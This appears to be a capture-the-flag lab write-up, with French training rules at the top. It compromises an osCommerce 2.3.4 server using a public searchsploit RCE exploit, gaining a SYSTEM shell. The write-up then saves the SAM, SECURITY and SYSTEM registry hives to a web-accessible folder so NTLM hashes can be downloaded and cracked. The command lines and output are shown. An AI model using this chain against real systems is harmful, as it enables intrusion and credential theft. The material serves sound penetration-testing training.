Voici un certain nombre de règles à faire respecter pendant la formation :
- Interdiction de lire des WU
- Vous devez trouver un moyen pour récupérer les bases sensibles en local
- Brute force juste autorisé pour crack des hash

Liste des outils qui peuvent vous servir : 
- NMAP
- Searchsploit
- Metasploit
- Mimikatz
- John/Hashcat

```
exegol start THM full --vpn .\Drachh.ovpn --desktop
```

# Write - Up
## Reconnaissance

Check if the box is up and responding: 

```
Oct 09, 2024 - 10:52:02 (CEST)] exegol-thm /workspace # ping 10.10.216.71
PING 10.10.216.71 (10.10.216.71) 56(84) bytes of data.
64 bytes from 10.10.216.71: icmp_seq=1 ttl=127 time=248 ms
64 bytes from 10.10.216.71: icmp_seq=2 ttl=127 time=170 ms
64 bytes from 10.10.216.71: icmp_seq=3 ttl=127 time=191 ms
64 bytes from 10.10.216.71: icmp_seq=4 ttl=127 time=214 ms
64 bytes from 10.10.216.71: icmp_seq=5 ttl=127 time=236 ms
^C
--- 10.10.216.71 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 170.132/211.699/247.870/28.513 ms
```

Network scan:

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
```

There's a webapp running on the server let's check it. 

![[Pasted image 20241009110402.png]]


![[Pasted image 20241009110423.png]]

URL: `http://10.10.216.71:8080/oscommerce-2.3.4/catalog/` so the webapp is using a CMS (Content management system) called **os-commerce** in version `2.3.4`. Let's search for some exploits :


![[Pasted image 20241009110604.png]]

Then we retrieve the exploit with :`searchsploit -m php/webapps/50128.php`
And we run it with the correct URL :

```
[Oct 09, 2024 - 11:06:49 (CEST)] exegol-thm /workspace # python3 50128.py http://10.10.216.71:8080/osco
mmerce-2.3.4/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

Checking location of SAM base: 

```
RCE_SHELL$ dir C:\windows\system32\config
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\windows\system32\config

11/27/2019  08:37 PM    <DIR>          .
11/27/2019  08:37 PM    <DIR>          ..
01/15/2017  11:39 PM            28,672 BCD-Template
11/27/2019  08:35 PM        30,932,992 COMPONENTS
11/27/2019  08:35 PM           262,144 DEFAULT
07/14/2009  03:04 AM    <DIR>          Journal
01/24/2017  11:21 PM    <DIR>          RegBack
11/27/2019  07:12 PM           262,144 SAM
11/27/2019  08:35 PM           262,144 SECURITY
11/27/2019  08:35 PM        22,806,528 SOFTWARE
10/12/2024  01:17 PM        13,107,200 SYSTEM
11/20/2010  09:48 PM    <DIR>          systemprofile
01/15/2017  03:46 PM    <DIR>          TxR
               7 File(s)     67,661,824 bytes
               6 Dir(s)  19,503,869,952 bytes free
```

Copying sensitive databases in the os-commerce file manager will make those available online. 

```
RCE_SHELL$ reg.exe save hklm\sam SAM
The operation completed successfully.

RCE_SHELL$ reg.exe save hklm\security SECURITY
The operation completed successfully.

RCE_SHELL$ reg.exe save hklm\system SYSTEM
The operation completed successfully.
```

URL : http://10.10.106.108:8080/oscommerce-2.3.4/catalog/install/includes

![[Pasted image 20241012145330.png]]

Then we download the databases and we can extract the NTLM hash of each session and crack the passwords. 

![[Pasted image 20241012145706.png]]

![[Pasted image 20241012145903.png]]

